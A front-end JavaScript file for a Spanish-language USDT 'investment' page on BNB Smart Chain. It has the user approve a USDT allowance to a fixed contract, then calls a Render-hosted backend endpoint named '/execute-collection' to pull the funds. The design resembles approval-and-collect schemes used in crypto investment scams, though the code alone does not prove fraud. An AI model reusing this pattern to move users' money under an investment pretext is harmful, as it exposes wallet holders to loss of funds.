"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");
const amountInput   = document.getElementById("investAmount");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Estado global de sesión y validaciones ─────────────────────────────────
let cachedUserBalance = 0;
let pendingInvestment = false;
let isWalletConnected = false;     
let currentRawProvider = null;     
let currentUserAddress = "";

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.innerHTML    = msg; 
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  
  if (type === "success") {
    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
  } else if (type === "error") {
    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
  } else {
    toastEl.style.removeProperty("background");
  }

  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  approveBtn.style.opacity = on ? "0.8" : "1";
  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── UI Component: Banner de Red Incorrecta ──────────────────────────────────
function updateNetworkBanner(show, onSwitchClick = null) {
  let banner = document.getElementById("networkBanner");
  if (!banner) {
    banner = document.createElement("div");
    banner.id = "networkBanner";
    banner.style.cssText = `
      background: #f59e0b; color: #000; padding: 10px 16px; text-align: center;
      font-weight: bold; font-size: 13px; cursor: pointer; display: none;
      border-radius: 8px; margin-bottom: 14px; box-sizing: border-box; width: 100%;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: opacity 0.3s ease;
    `;
    const targetCard = document.querySelector(".card, main, form") || document.body;
    targetCard.insertBefore(banner, targetCard.firstChild);
  }

  if (show) {
    banner.style.display = "block";
    banner.innerHTML = "⚠️ Estás en la red incorrecta. Haz clic aquí para cambiar a BNB Smart Chain";
    banner.onclick = onSwitchClick;
  } else {
    banner.style.display = "none";
  }
}

// ─── UI Component: Stepper Visual de Progreso ─────────────────────────────────
function updateStepperUI(activeStep) { // 1, 2, 3 o 0 para ocultar
  let stepper = document.getElementById("dappStepper");
  if (!stepper) {
    stepper = document.createElement("div");
    stepper.id = "dappStepper";
    stepper.style.cssText = `
      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
      padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; font-size: 13px;
    `;
    const targetCard = document.querySelector(".card, main, form") || document.body;
    targetCard.insertBefore(stepper, targetCard.firstChild);
  }

  if (activeStep === 0) {
    stepper.style.display = "none";
    return;
  }

  stepper.style.display = "block";
  const steps = [
    { num: 1, label: "Verificación de red y gas" },
    { num: 2, label: "Aprobación de USDT" },
    { num: 3, label: "Ejecución de inversión" }
  ];

  stepper.innerHTML = `
    <div style="font-weight:bold; margin-bottom:8px; color:#94a3b8;">Progreso de la Inversión:</div>
    ${steps.map(s => {
      let icon = "⏳";
      let color = "#94a3b8";
      if (s.num < activeStep) { icon = "✅"; color = "#4ade80"; }
      else if (s.num === activeStep) { icon = "🔄"; color = "#38bdf8"; }
      return `
        <div style="display:flex; align-items:center; gap:8px; margin:4px 0; color:${color};">
          <span>${icon}</span> <span>Paso ${s.num}: ${s.label}</span>
        </div>
      `;
    }).join("")}
  `;
}

// ─── UI Component: Historial de Transacciones (localStorage) ─────────────────
function saveAndRenderTxHistory(txHash) {
  if (!txHash) return;
  let history = [];
  try {
    history = JSON.parse(localStorage.getItem("dapp_tx_history") || "[]");
  } catch (_) {}
  
  if (!history.includes(txHash)) {
    history.unshift(txHash);
    if (history.length > 5) history.pop(); // Guarda máximo las últimas 5
    localStorage.setItem("dapp_tx_history", JSON.stringify(history));
  }
  renderTxHistoryUI();
}

function renderTxHistoryUI() {
  let historyContainer = document.getElementById("txHistoryContainer");
  let history = [];
  try {
    history = JSON.parse(localStorage.getItem("dapp_tx_history") || "[]");
  } catch (_) {}

  if (history.length === 0) {
    if (historyContainer) historyContainer.style.display = "none";
    return;
  }

  if (!historyContainer) {
    historyContainer = document.createElement("div");
    historyContainer.id = "txHistoryContainer";
    historyContainer.style.cssText = `
      margin-top: 20px; padding: 12px; background: rgba(0,0,0,0.2); 
      border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); font-size: 13px;
    `;
    const targetCard = document.querySelector(".card, main, form") || document.body;
    targetCard.appendChild(historyContainer);
  }

  historyContainer.style.display = "block";
  historyContainer.innerHTML = `
    <div style="font-weight: bold; margin-bottom: 8px; color: #cbd5e1;">Historial de Inversiones Recientes:</div>
    ${history.map(hash => `
      <div style="display: flex; justify-content: space-between; align-items: center; margin: 6px 0; background: rgba(255,255,255,0.03); padding: 6px 10px; border-radius: 6px;">
        <span style="font-family: monospace; color: #94a3b8;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
        <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color: #38bdf8; text-decoration: underline; font-size: 12px;">BscScan ↗</a>
      </div>
    `).join("")}
  `;
}

// ─── Gestión de la Píldora de Cuenta (Wallet Pill UI) ─────────────────────────
function updateWalletPill(address, isConnected) {
  let pillContainer = document.getElementById("walletPillContainer");
  
  if (!pillContainer) {
    pillContainer = document.createElement("div");
    pillContainer.id = "walletPillContainer";
    pillContainer.style.cssText = `
      display: flex; justify-content: space-between; align-items: center;
      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
      padding: 8px 14px; border-radius: 50px; margin-bottom: 16px; font-size: 14px;
      backdrop-filter: blur(10px); width: 100%; box-sizing: border-box;
    `;
    const targetCard = document.querySelector(".card, main, form") || document.body;
    targetCard.insertBefore(pillContainer, targetCard.firstChild);
  }

  if (isConnected && address) {
    const shortAddr = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    pillContainer.style.display = "flex";
    pillContainer.innerHTML = `
      <span style="display: flex; align-items: center; gap: 6px; color: #4ade80;">
        <span style="width: 8px; height: 8px; background: #4ade80; border-radius: 50%; display: inline-block;"></span>
        <b>${shortAddr}</b>
      </span>
      <button id="disconnectWalletBtn" style="background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171; padding: 4px 10px; border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: bold;">
        Desconectar
      </button>
    `;
    
    document.getElementById("disconnectWalletBtn").onclick = () => {
      resetAppUI();
    };
  } else {
    pillContainer.style.display = "none";
    pillContainer.innerHTML = "";
  }
}

// ─── UI Reset Helper (Desconexión Real y Limpieza) ───────────────────────────
function resetAppUI() {
  isWalletConnected = false;
  currentRawProvider = null;
  currentUserAddress = "";

  const balanceLabel = document.getElementById("walletBalanceLabel");
  if (balanceLabel) {
    balanceLabel.textContent = "Saldo: -- USDT";
  }

  if (amountInput) {
    amountInput.value = "";
    amountInput.style.removeProperty("border-color");
  }

  cachedUserBalance = 0;
  pendingInvestment = false;
  setLoading(false);
  updateWalletPill("", false);
  updateNetworkBanner(false);
  updateStepperUI(0);
  showToast("Billetera desconectada.", "default", 3000);

  if (window.modal && typeof window.modal.disconnect === "function") {
    try {
      window.modal.disconnect();
    } catch (_) {}
  }
}

// ─── Validación en tiempo real del Input ─────────────────────────────────────
if (amountInput) {
  amountInput.addEventListener("input", (e) => {
    const val = parseFloat(e.target.value) || 0;
    if (cachedUserBalance > 0 && val > cachedUserBalance) {
      amountInput.style.borderColor = "#dc3545";
    } else {
      amountInput.style.removeProperty("border-color");
    }
  });
}

// ─── Live Balance & Network Check ─────────────────────────────────────────────
async function fetchAndDisplayUserBalances(rawProvider) {
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    // Verificación proactiva de red
    const network = await provider.getNetwork();
    const chainIdNum = Number(network.chainId);
    
    const handleNetworkSwitch = async () => {
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID_HEX }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_CHAIN_PARAMS]
          });
        } else {
          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
        }
      }
    };

    if (chainIdNum !== 56) {
      updateNetworkBanner(true, handleNetworkSwitch);
    } else {
      updateNetworkBanner(false);
    }

    const signer = await provider.getSigner();
    currentUserAddress = await signer.getAddress();
    
    updateWalletPill(currentUserAddress, true);

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
    const usdtBal = await usdtContract.balanceOf(currentUserAddress);
    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
    
    cachedUserBalance = parseFloat(formattedUsdt);

    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (balanceLabel) {
      balanceLabel.textContent = `Saldo: ${cachedUserBalance.toFixed(2)} USDT`;
    }

    const maxBtn = document.getElementById("maxBtn");
    if (maxBtn) {
      maxBtn.onclick = () => {
        if (amountInput) {
          const maxUsdt = Math.max(0, cachedUserBalance - 1); 
          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
          amountInput.dispatchEvent(new Event('input'));
        }
      };
    }
  } catch (err) {
    console.error("Error al sincronizar saldos en vivo:", err);
    resetAppUI();
  }
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = amountInput?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Suscripciones reactivas de Reown AppKit ──────────────────────────────────
if (window.modal && typeof window.modal.subscribeProviders === "function") {
  window.modal.subscribeProviders((state) => {
    const rawProvider = state["eip155"]; 
    
    if (rawProvider) {
      isWalletConnected = true;
      currentRawProvider = rawProvider;
      fetchAndDisplayUserBalances(rawProvider); 
      
      if (pendingInvestment) {
        pendingInvestment = false; 
        runInvestmentFlow(rawProvider); 
      }
    } else {
      resetAppUI();
    }
  });
}

if (window.modal && typeof window.modal.subscribeState === "function") {
  window.modal.subscribeState((state) => {
    if (!state.open) {
      let rawProvider = null;
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}

      if (!rawProvider && !isWalletConnected) {
        pendingInvestment = false;
        setLoading(false);
        updateStepperUI(0);
      }
    }
  });
}

document.addEventListener("DOMContentLoaded", () => {
  renderTxHistoryUI(); // Renderiza transacciones anteriores al cargar la web
  if (window.modal && typeof window.modal.getWalletProvider === "function") {
    try {
      const activeProvider = window.modal.getWalletProvider();
      if (activeProvider) {
        isWalletConnected = true;
        currentRawProvider = activeProvider;
        fetchAndDisplayUserBalances(activeProvider);
      }
    } catch (_) {}
  }
});

// ─── Evento del botón principal ───────────────────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!isWalletConnected || !currentRawProvider) {
      pendingInvestment = true; 
      setLoading(true, "Abriendo selector de billetera...");
      
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open(); 
        } catch (err) {
          console.error("Error al abrir AppKit:", err);
          pendingInvestment = false;
          setLoading(false);
        }
      }
      return; 
    }

    await runInvestmentFlow(currentRawProvider);
  });
}

// ─── Flujo centralizado de inversión con Stepper y Banner ─────────────────────
async function runInvestmentFlow(rawProvider) {
  setLoading(true, "Conectando proveedor…");
  updateStepperUI(1); // Paso 1: Verificación de red y gas
  
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    // 1. Red BSC
    setLoading(true, "Verificando red BSC...");
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      setLoading(true, "⚠️ Revisa tu billetera: Cambia a BSC…");
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_CHAIN_PARAMS]
          });
        } else {
          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
          setLoading(false);
          updateStepperUI(0);
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // 2. Gas BNB
    setLoading(true, "Verificando saldo de gas (BNB)…");
    const bnbBalance = await provider.getBalance(userAddress);
    const minGasRequired = ethers.parseEther("0.0005"); 

    if (bnbBalance < minGasRequired) {
      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
      setLoading(false);
      updateStepperUI(0);
      return;
    }

    // 3. Montos y USDT
    const rawInputVal = amountInput ? amountInput.value : "1";
    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);

    if (cachedUserBalance > 0 && parseFloat(rawInputVal) > cachedUserBalance) {
      showToast("El monto ingresado supera tu saldo disponible.", "error");
      setLoading(false);
      updateStepperUI(0);
      return;
    }

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    setLoading(true, "Validando saldo de USDT…");
    const usdtBalance = await usdtContract.balanceOf(userAddress);

    if (usdtBalance < requiredAmount) {
      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
      setLoading(false);
      updateStepperUI(0);
      return;
    }

    // 4. Allowance (Paso 2 del Stepper)
    updateStepperUI(2); 
    setLoading(true, "Verificando autorizaciones...");
    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
    
    if (allowance < requiredAmount) {
      setLoading(true, "⚠️ Revisa tu billetera: Aprueba USDT...");
      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
      
      setLoading(true, "Confirmando aprobación en red...");
      await txApprove.wait();
    }

    // 5. Backend (Paso 3 del Stepper)
    updateStepperUI(3);
    setLoading(true, "Procesando inversión en protocolo...");
    const txCollect = await triggerBackendCollect(userAddress); 

    // 6. Éxito
    const txHash = txCollect?.hash || "";
    if (txHash) {
      saveAndRenderTxHistory(txHash); // Guarda en localStorage
      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
    } else {
      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
    }

    updateStepperUI(0); // Ocultar stepper al terminar con éxito

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("denied") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Operación cancelada por el usuario.", "default");
    } else {
      console.error("Web3 Error crítico:", err);
      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
    }
  } finally {
    setLoading(false);
    updateStepperUI(0);
  }
}
